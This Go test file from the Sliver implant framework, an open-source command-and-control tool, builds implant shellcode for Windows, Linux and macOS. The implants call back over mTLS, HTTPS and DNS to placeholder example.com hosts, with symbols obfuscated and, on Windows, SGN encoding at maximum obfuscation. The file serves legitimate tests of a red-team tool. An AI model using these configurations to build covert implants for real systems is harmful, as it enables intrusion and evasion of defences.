package generate

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"fmt"
	"os"
	"runtime"
	"testing"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/server/configs"
	"github.com/bishopfox/sliver/server/encoders/shellcode/sgn"
)

func TestSliverShellcodeWindows(t *testing.T) {
	// Shared Library Shellcode
	multiWindowsLibraryShellcode(t, true)
	multiWindowsLibraryShellcode(t, false)
}

func multiWindowsLibraryShellcode(t *testing.T, debug bool) {
	t.Logf("[multi] SHELLCODE windows/amd64 - debug: %v", debug)
	name := fmt.Sprintf("multilibrary_shellcode_test%d", nonce)
	config := &clientpb.ImplantConfig{
		GOOS:   "windows",
		GOARCH: "amd64",

		C2: []*clientpb.ImplantC2{
			{URL: "mtls://1.example.com"},
			{Priority: 2, URL: "mtls://2.example.com"},
			{URL: "https://3.example.com"},
			{URL: "dns://4.example.com", Options: "asdf"},
		},
		Debug:            debug,
		ObfuscateSymbols: true,
		Format:           clientpb.OutputFormat_SHELLCODE,
		IsShellcode:      true,
		IsSharedLib:      false,
		Exports:          []string{"FoobarW"},
		IncludeMTLS:      true,
		IncludeHTTP:      true,
		IncludeDNS:       true,
	}
	httpC2Config := configs.GenerateDefaultHTTPC2Config()
	nonce++
	build, _ := GenerateConfig(name, config)
	binPath, err := SliverShellcode(name, build, config, httpC2Config.ImplantConfig)
	if err != nil {
		t.Fatalf("%v", err)
	}
	defer cleanupGeneratedArtifacts(t, binPath)

	// encode bin with sgn
	bin, err := os.ReadFile(binPath)
	if err != nil {
		t.Fatalf("reading generated shared lib shellcode failed: %v", err)
	}
	_, err = sgn.EncodeShellcodeWithConfig(bin, sgn.SGNConfig{
		Iterations:     1,
		PlainDecoder:   false,
		Safe:           true,
		MaxObfuscation: 100,
	})
	if err != nil {
		t.Fatalf("sgn encode failed: %v", err)
	}
}

func TestSliverShellcodeLinux(t *testing.T) {
	multiLinuxShellcode(t, "amd64", true)
	multiLinuxShellcode(t, "amd64", false)

	multiLinuxShellcode(t, "arm64", true)
	multiLinuxShellcode(t, "arm64", false)
}

func multiLinuxShellcode(t *testing.T, goarch string, debug bool) {
	t.Helper()

	t.Logf("[multi] SHELLCODE linux/%s - debug: %v", goarch, debug)
	name := fmt.Sprintf("multi_linux_shellcode_test%d", nonce)
	config := &clientpb.ImplantConfig{
		GOOS:   "linux",
		GOARCH: goarch,

		C2: []*clientpb.ImplantC2{
			{URL: "mtls://1.example.com"},
			{Priority: 2, URL: "mtls://2.example.com"},
			{URL: "https://3.example.com"},
			{URL: "dns://4.example.com", Options: "asdf"},
		},
		Debug:            debug,
		ObfuscateSymbols: true,
		Format:           clientpb.OutputFormat_SHELLCODE,
		IsShellcode:      true,
		IsSharedLib:      false,
		Exports:          []string{"FoobarW"},
		IncludeMTLS:      true,
		IncludeHTTP:      true,
		IncludeDNS:       true,
	}
	httpC2Config := configs.GenerateDefaultHTTPC2Config()
	nonce++
	build, _ := GenerateConfig(name, config)
	binPath, err := SliverShellcode(name, build, config, httpC2Config.ImplantConfig)
	if err != nil {
		t.Fatalf("%v", err)
	}
	defer cleanupGeneratedArtifacts(t, binPath)

	bin, err := os.ReadFile(binPath)
	if err != nil {
		t.Fatalf("reading generated linux shellcode failed: %v", err)
	}
	if len(bin) == 0 {
		t.Fatalf("generated linux shellcode is empty")
	}
}

func TestSliverShellcodeDarwin(t *testing.T) {
	// darwin shellcode generation requires a native toolchain (no default zig/osxcross support).
	if runtime.GOOS != "darwin" {
		t.Skipf("Skipping darwin shellcode generation on %s", runtime.GOOS)
	}

	multiDarwinShellcode(t, true)
	multiDarwinShellcode(t, false)
}

func multiDarwinShellcode(t *testing.T, debug bool) {
	t.Helper()

	t.Logf("[multi] SHELLCODE darwin/arm64 - debug: %v", debug)
	name := fmt.Sprintf("multi_darwin_shellcode_test%d", nonce)
	config := &clientpb.ImplantConfig{
		GOOS:   "darwin",
		GOARCH: "arm64",

		C2: []*clientpb.ImplantC2{
			{URL: "mtls://1.example.com"},
			{Priority: 2, URL: "mtls://2.example.com"},
			{URL: "https://3.example.com"},
			{URL: "dns://4.example.com", Options: "asdf"},
		},
		Debug:            debug,
		ObfuscateSymbols: true,
		Format:           clientpb.OutputFormat_SHELLCODE,
		IsShellcode:      true,
		IsSharedLib:      false,
		Exports:          []string{"FoobarW"},
		IncludeMTLS:      true,
		IncludeHTTP:      true,
		IncludeDNS:       true,
	}
	httpC2Config := configs.GenerateDefaultHTTPC2Config()
	nonce++
	build, _ := GenerateConfig(name, config)
	binPath, err := SliverShellcode(name, build, config, httpC2Config.ImplantConfig)
	if err != nil {
		t.Fatalf("%v", err)
	}
	defer cleanupGeneratedArtifacts(t, binPath)

	bin, err := os.ReadFile(binPath)
	if err != nil {
		t.Fatalf("reading generated darwin shellcode failed: %v", err)
	}
	if len(bin) == 0 {
		t.Fatalf("generated darwin shellcode is empty")
	}
}
